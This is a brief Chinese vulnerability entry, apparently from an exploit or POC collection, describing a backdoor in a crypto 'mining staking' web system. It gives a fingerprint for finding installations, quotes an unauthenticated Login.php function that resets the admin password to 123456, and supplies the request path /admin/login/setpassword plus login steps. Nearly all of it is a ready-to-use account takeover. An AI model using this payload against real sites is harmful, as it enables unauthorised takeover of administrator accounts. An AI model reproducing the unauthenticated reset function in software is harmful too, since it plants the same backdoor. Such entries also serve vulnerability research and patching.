# 某U挖矿质押单语言系统前台未授权修改管理员密码

某U挖矿质押单语言系统前台未授权修改管理员密码 ｜ 未授权访问 ｜ —
- **指纹**：`"/static/index/css/login/framework7.ios.min.css"`

**Payload**
```
位于 /admin/controller/Login.php 有个很明显操纵SQL的update操作，重置了管理员的密码为123456，且未设置鉴权，非常明显是个后门.
public function setpassword()
$password = '123456';
$res = db('admin')->where('username','admin')->update(['password'=>password_hash($password,PASSWORD_DEFAULT)]);
echo $res?1:0;
Payload:
/admin/login/setpassword
然后直接登录就行 /admin
```
- **响应特征**：200